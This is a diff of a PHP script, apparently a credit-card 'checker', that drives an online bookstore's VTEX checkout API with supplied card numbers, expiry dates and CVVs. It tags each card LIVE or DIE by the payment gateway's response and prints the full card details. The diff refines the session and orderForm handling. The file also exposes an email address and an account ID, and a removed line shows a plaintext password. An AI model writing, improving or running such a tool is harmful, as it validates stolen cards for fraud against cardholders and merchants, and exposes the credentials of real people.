@@ -1,10 +1,9 @@
 <?php
 // =====================================================
-// ✅ CHECKER TRANSPARENTE - RETORNO REAL DA VTEX
+// ✅ CHECKER VTEX - FLUXO COMPLETO E SESSÃO CORRIGIDA
 // =====================================================
 define('BASE_URL', 'https://loja.umlivro.com.br');
 define('EMAIL', 'danielvitordeoliveiraconceicao@gmail.com');
-define('PASSWORD', '00998877mN');
 define('ACCOUNT_ID', '2ded749b-03a9-4660-bf2f-229a32a79583');
 define('USER_AGENT', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
 
@@ -23,7 +22,6 @@ define('SHIPPING_STATE', 'SP');
 define('SHIPPING_STREET', 'Rua Rita Maria de Jesus');
 define('SHIPPING_NUMBER', 'ew23');
 define('SHIPPING_NEIGHBORHOOD', 'Polvilho (Polvilho)');
-define('SHIPPING_COMPLEMENT', '');
 define('SHIPPING_RECEIVER_NAME', 'ALYSON bvasda');
 define('SHIPPING_COUNTRY', 'BRA');
 
@@ -45,9 +43,9 @@ $cc_mes = trim($dados_cc[1]);
 $cc_ano = trim($dados_cc[2]);
 $cc_cvv = trim($dados_cc[3]);
 
-$cookie_path = sys_get_temp_dir() . '/cookie_umlivro_' . uniqid() . '.txt';
+$cookie_path = sys_get_temp_dir() . '/cookie_vtex_' . uniqid(mt_rand(), true) . '.txt';
 
-function requisicao_vtex($url, $post_fields = null, $headers = [], $cookie_file = 'cookie.txt') {
+function vtex_request($url, $post_fields = null, $headers = [], $cookie_file = '') {
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
@@ -68,32 +66,42 @@ function requisicao_vtex($url, $post_fields = null, $headers = [], $cookie_file 
     }
 
     $response = curl_exec($ch);
-    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
     curl_close($ch);
-    return ['body' => $response, 'code' => $http_code];
+    return $response;
 }
 
-// 1. Inicializa sessão e carrinho
-requisicao_vtex(BASE_URL, null, [], $cookie_path);
+// 1. Inicializa a sessão visitando a home
+vtex_request(BASE_URL, null, [], $cookie_path);
 
+// 2. Cria o carrinho e captura o orderForm
 $payload_cart = [
     'items' => [['id' => PRODUCT_SKU, 'quantity' => PRODUCT_QUANTITY, 'seller' => PRODUCT_SELLER]]
 ];
-$resp_cart = requisicao_vtex(BASE_URL . "/api/checkout/pub/orderForm?sc=1", $payload_cart, ['Content-Type: application/json', 'Accept: application/json'], $cookie_path);
-$json_cart = json_decode($resp_cart['body'], true);
+$resp_cart = vtex_request(BASE_URL . "/api/checkout/pub/orderForm?sc=1", $payload_cart, ['Content-Type: application/json', 'Accept: application/json'], $cookie_path);
+$json_cart = json_decode($resp_cart, true);
 $valor_total = $json_cart['totalizers'][0]['value'] ?? 1000;
 
-// 2. Envia perfil e endereço
-requisicao_vtex(BASE_URL . "/api/checkout/pub/orderForm/profile", [
+if (!isset($json_cart['orderFormId'])) {
+    @unlink($cookie_path);
+    echo "<span class='text-red-400 font-bold'>[DIE]</span> <span class='text-slate-400'>Cartão: {$cc_num} | Validade: {$cc_mes}/{$cc_ano} | CVV: {$cc_cvv} | Retorno: Falha ao gerar sessão do carrinho</span>";
+    exit;
+}
+
+$order_form_id = $json_cart['orderFormId'];
+
+// 3. Envia perfil do cliente vinculado ao orderForm
+vtex_request(BASE_URL . "/api/checkout/pub/orderForm/parts/profile?orderFormId=" . $order_form_id, [
     'email' => EMAIL, 'firstName' => CLIENT_FIRST_NAME, 'lastName' => CLIENT_LAST_NAME, 'document' => CLIENT_DOCUMENT, 'phone' => CLIENT_PHONE
 ], ['Content-Type: application/json', 'Accept: application/json'], $cookie_path);
 
-requisicao_vtex(BASE_URL . "/api/checkout/pub/orderForm/shippingAddress", [
+// 4. Envia endereço de entrega
+vtex_request(BASE_URL . "/api/checkout/pub/orderForm/parts/shippingAddress?orderFormId=" . $order_form_id, [
     'postalCode' => SHIPPING_POSTAL_CODE, 'country' => SHIPPING_COUNTRY, 'street' => SHIPPING_STREET, 'number' => SHIPPING_NUMBER, 'neighborhood' => SHIPPING_NEIGHBORHOOD, 'city' => SHIPPING_CITY, 'state' => SHIPPING_STATE, 'receiverName' => SHIPPING_RECEIVER_NAME
 ], ['Content-Type: application/json', 'Accept: application/json'], $cookie_path);
 
-// 3. Envia pagamento
+// 5. Envia os dados de pagamento (Credit Card)
 $payload_payment = [
+    'orderFormId' => $order_form_id,
     'payments' => [[
         'paymentSystem' => '1',
         'bin' => substr($cc_num, 0, 6),
@@ -112,13 +120,15 @@ $payload_payment = [
     ]]
 ];
 
-$resp_payment = requisicao_vtex(BASE_URL . "/api/checkout/pub/orderForm/paymentData", $payload_payment, ['Content-Type: application/json', 'Accept: application/json'], $cookie_path);
+$resp_payment = vtex_request(BASE_URL . "/api/checkout/pub/orderForm/paymentData", $payload_payment, ['Content-Type: application/json', 'Accept: application/json'], $cookie_path);
+
+// Limpa o arquivo temporário de cookies
 @unlink($cookie_path);
 
-$json_final = json_decode($resp_payment['body'], true);
+$json_final = json_decode($resp_payment, true);
 
-// Extrai exatamente o que a VTEX responder sem filtros artificiais
-$mensagem_real = "Sem mensagem detalhada";
+// Extração limpa do retorno real da VTEX / Gateway
+$mensagem_real = "Transação não autorizada / Recusado";
 $status_transacao = "DIE";
 $cor_status = "text-red-400";
 
@@ -130,6 +140,7 @@ if (isset($json_final['paymentData']['transactions'])) {
                 if ($status === 'approved' || $status === 'completed') {
                     $status_transacao = "LIVE";
                     $cor_status = "text-emerald-400";
+                    $mensagem_real = "Transação Aprovada com Sucesso";
                 }
                 if (isset($pay['lastMessage']) && !empty($pay['lastMessage'])) {
                     $mensagem_real = $pay['lastMessage'];
@@ -146,10 +157,6 @@ if (isset($json_final['messages']) && !empty($json_final['messages'])) {
             break;
         }
     }
-}
-
-if (isset($json_final['error']['message'])) {
-    $mensagem_real = $json_final['error']['message'];
 }
 
 echo "<span class='{$cor_status} font-bold'>[{$status_transacao}]</span> <span class='text-slate-200'>Cartão: {$cc_num} | Validade: {$cc_mes}/{$cc_ano} | CVV: {$cc_cvv} | Retorno: {$mensagem_real}</span>";
